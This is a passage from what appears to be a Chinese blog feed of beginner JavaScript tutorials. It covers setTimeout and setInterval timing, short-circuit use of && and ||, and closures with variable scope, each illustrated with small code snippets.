punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>效果就是不断输出字符“0”。</p><h1 id="clearInterval"><a href="#clearInterval" class="headerlink" title="clearInterval()"></a>clearInterval()</h1><p>用法与 clearTimeout() 一样，终止 setInterval() 的执行，括号中填 setInterval() 的返回值。</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> int2 <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">clearInterval</span><span class="token punctuation">(</span>int2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这样就能终止输出。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>有个小问题，用 setTimeout() 举例，假如代码像下面这样写：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token function">fx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相比上面，就是函数第一个参数少了双引号，猜一下后果会怎样……</p><p>后果当然是页面加载后立刻弹出提示框，并不会延时 3 秒。下面的写法也是类似的效果：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>原因都一样，无论是语句块 <code>fx()</code> 还是匿名函数 <code>(function()&#123;&#125;)()</code>，都是会<strong>立刻执行</strong>的语句，而加双引号的 <code>&quot;fx()&quot;</code> 和 <code>function()&#123;&#125;</code> 就是当成一个<strong>参数</strong>传递给了函数 setTimeout()，然后这个<strong>参数</strong>语句直到 setTimeou() 真正执行时才生效，也就是延时3秒后执行。</p><p>函数 setInterval() 的这个性质与 setTimeout() <strong>类似</strong>。</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><h2 id="回调函数参数"><a href="#回调函数参数" class="headerlink" title="回调函数参数"></a>回调函数参数</h2><p>setTimeout 常见的便是使用两个参数，回调函数和时间，但是它还可以接受更多的参数，作为回调函数调用时传入的参数（可以有多个，按顺序填入即可）；</p><p>举个例子：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 3 秒后输出：</span><span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>setTimeout, setInterval  的返回值都是一个数字，具体值取决于当前环境的分配，每次调用后这个数字会加一，<code>clearTimeout()</code>, <code>clearInterval()</code> 方法传入的参数便是这个数字，只不过平时都是以变量代替；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> c <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 1 （也可能是其他数字）</span><span class="token comment">// 2</span><span class="token comment">// 3</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 相当于 clearTiemout(1);</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// clearTimeout(2)</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// clearTimeout(3)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="时间精准度"><a href="#时间精准度" class="headerlink" title="时间精准度"></a>时间精准度</h2><p>setTimeout 会等到当前任务执行完，即使延迟时间已经到了，所以这也是常说 JavaScript 计时器不一定准确的原因所在，存在所用时间大于指定时间的情况；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">'console.log("time")'</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 该函数执行 5s 左右</span><span class="token keyword">function</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'end1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'end2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// start</span><span class="token comment">// end1</span><span class="token comment">// end2</span><span class="token comment">// time</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="setInterval-的执行间隔"><a href="#setInterval-的执行间隔" class="headerlink" title="setInterval 的执行间隔"></a>setInterval 的执行间隔</h2><p>该函数的作用是每隔一定时间执行一遍代码，但是代码的执行时间，被<strong>包括</strong>在间隔时间内，如果执行时间超过了间隔时间，那么下一次执行会立即执行；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token number">3000</span><span class="token punctuation">;</span><span class="token keyword">let</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">;</span> <span class="token comment">// 使该函数 执行时间为 3s</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSeconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSeconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setInterval</span><span class="token punctuation">(</span>delay<span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后的输出结果将是输出间隔变为 3s，而不是设定的 2s，因为 <code>delay()</code> 函数的执行时间超过了 <code>setInterval()</code> 的间隔时间，即间隔时间过了也要等到函数执行完毕，然后下一遍执行就紧接着来，不再有间隔时间，所以就使得最后的结果显示为每隔 3s 输出，其实就是整个 <code>delay</code> 函数的执行时间，间隔时间可以理解为被<strong>挤</strong>得没有了；</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript计时器 setTimeout setInterval </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 逻辑运算符 “&amp;&amp;” 和 “||” 短路原则的应用</title>
      <link href="/2024/09/27/javascript/javascript-luo-ji-yun-suan-fu-he-duan-lu-yuan-ze-de-ying-yong/"/>
      <url>/2024/09/27/javascript/javascript-luo-ji-yun-suan-fu-he-duan-lu-yuan-ze-de-ying-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h1><p>在Javascript中，有逻辑运算符 <code>与 &amp;&amp;</code>, <code>或 ||</code>, <code>非 !</code>，常在条件句或循环中进行逻辑判断。</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">=</span> b <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b <span class="token operator">=</span> c <span class="token operator">||</span> a <span class="token operator">!=</span> c<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>括号中表达式值为<strong>真</strong>，最后提示“true”。</p><h1 id="短路原则"><a href="#短路原则" class="headerlink" title="短路原则"></a>短路原则</h1><p>在逻辑运算中，这是一个通用的原则，这是由于表达式从左到右执行的特性，为了减少运算量而给运算器规定的操作。主要针对 <code>&amp;&amp;</code> 和 <code>||</code> 两种运算。</p><ul><li><p><code>&amp;&amp;</code> 的判断是<strong>同真为真，一假为假</strong>，则运算如果左边的表达式值为 <code>false</code>，那么就不会再执行右边的表达式了，如果左表达式为 <code>true</code>，就会继续执行右表达式；</p></li><li><p><code>||</code> 的判断是<strong>一真为真，同假为假</strong>，则运算如果坐表达式值为 <code>true</code>，那么就不用执行右边的表达式了，如果左表达式为 <code>false</code>，就会继续执行右表达式；</p></li></ul><p>举例说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"msg1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"msg2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"msg3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"msg4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>结果是提示<strong>“msg1”</strong>和<strong>“msg4”</strong>。原理如上述。</p><p>因此，如果有以下表达式：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也许你会使用<strong>三目运算</strong>简化成这样：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其实也可以这样写：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="Javascript中的应用"><a href="#Javascript中的应用" class="headerlink" title="Javascript中的应用"></a>Javascript中的应用</h1><p>在javascript中，只有<code>对象(Object)</code>和布尔值<code>true</code>为真，其它例如 <code>undefined</code>, <code>NaN</code>, <code>false</code> 等，值为 <code>false</code>。为被定义的对象或未赋值变量也是 <code>false</code>，因为其值都是 <code>undefined</code>，这里就可以应用于检查某变量是否<strong>已定义</strong>。</p><p>举例说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> b<span class="token punctuation">;</span>a <span class="token operator">&amp;&amp;</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"defined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//已定义a，提示“defined”</span>o <span class="token operator">&amp;&amp;</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"defined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//已定义对象o，提示“defined”</span>Object <span class="token operator">&amp;&amp;</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"defined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//Object是一个已知的全局对象，提示“defined”</span>b <span class="token operator">||</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"not defined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//b未赋值，提示“not defined”</span>p <span class="token operator">||</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"not defined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//未定义p，提示“not defined”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了这个也能衍生出其它相同原理的应用，类似于判断赋值 <code>var  a = (b &gt; 0) &amp;&amp; &#39;9&#39;</code> 或判断定义变量 <code>var abc = abc || &quot;&quot;</code> 等。</p><p>js中使用这种方法可以减少代码量，提示性能，但同时也降低了代码<strong>可读性</strong>，比如个人觉得还是看以下代码比较舒适：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法的选择就要视情况而权衡了。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript逻辑运算 短路原则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 闭包详解</title>
      <link href="/2024/09/27/javascript/javascript-bi-bao-xiang-jie/"/>
      <url>/2024/09/27/javascript/javascript-bi-bao-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h1><p>首先来了解一下Javascript中变量的作用域，除了常见的普通变量外，<strong>对象</strong>和<strong>函数</strong>也是一种变量。变量分为局部变量和全局变量。</p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>局部变量就是指在<strong>函数内部</strong>定义的变量，作用域是函数内部网，此变量通常只能在函数内部访问，和外界是区分开的，所以变量名即使和外部的<strong>重复</strong>，也是两个独立的变量，不会相互影响。局部变量在函数执行是创建，执行完后<strong>销毁</strong>。</p><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>全局变量就是函数外部定义的变量，作用域是网页中的所有脚本和函数，它们都能够访问，全局变量是页面加载时创建，页面关闭后销毁。</p><p>综合举例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 <code>var a = 0;</code> 就是全局变量，<code>var a = 1;</code> 是局部变量，虽然名字重复，但这里是两个独立变量，但是还是不建议出现重复，提高代码可读性；<code>b = 2;</code> 也是<strong>全局变量</strong>，因为规定函数内部申明的变量，如果不加 <code>var</code>，即会被认为是全局变量，尤其这点需要小心。</p><h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><p>先通俗的总结一下，闭包就是一个可以访问其他函数内部变量的<strong>函数</strong>，即一个定义在函数内部的函数，也叫<strong>内嵌函数</strong>。</p><p>其次，是闭包的作用，因为通常情况函数内部变量是无法在外部访问的，即全局变量也局部变量的区别，而闭包，就实现了能在外部访问某函数内部变量的功能，让这些变量值始终保存在<strong>内存</strong>中。</p><p>然后，来讲一下如何实现闭包。有以下代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>           <span class="token comment">//定义一个局部变量</span><span class="token keyword">function</span> <span class="token function">fun2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//这里的 fun2() 就是闭包</span><span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//fun2() 是 fun1()的子函数，所以能访问之前定义的局部变量，这个是关键</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> fun2<span class="token punctuation">;</span>         <span class="token comment">//然后通过这里，把之前得到的局部变量成功返回到外部去</span><span class="token punctuation">&#125;</span><span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">//正常执行函数</span><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//将内部变量传递出去，传给变量 result</span><span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">//执行这个函数实现对局部变量的访问</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然形式不止这一种，万变不离其宗，最后实现的功能是一样的，例如下面的方法也是可行的：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>也许在很多文章中都能看到这句话“避免滥用闭包”，的确，由于闭包会使一些变量一直保存在内存中，所以如果大量使用的话就会消耗大量内存，影响网页性能。</p><p>同时，由于闭包的特性，还会在外部改变函数的内部变量值，有时候这是很危险的，举个例子：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">fun2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        a<span class="token operator">++</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> fun2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> change <span class="token operator">=</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 这里 fun1 函数被正常执行，输出 1</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 在外部执行这个函数后，函数内部变量 a 的值就被改变了，输出 2</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 输出 3，以此类推</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js闭包 js作用域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 面向对象编程</title>
      <link href="/2024/09/27/javascript/javascript-mian-xiang-dui-xiang-bian-cheng/"/>
      <url>/2024/09/27/javascript/javascript-mian-xiang-dui-xiang-bian-cheng/</url>
      
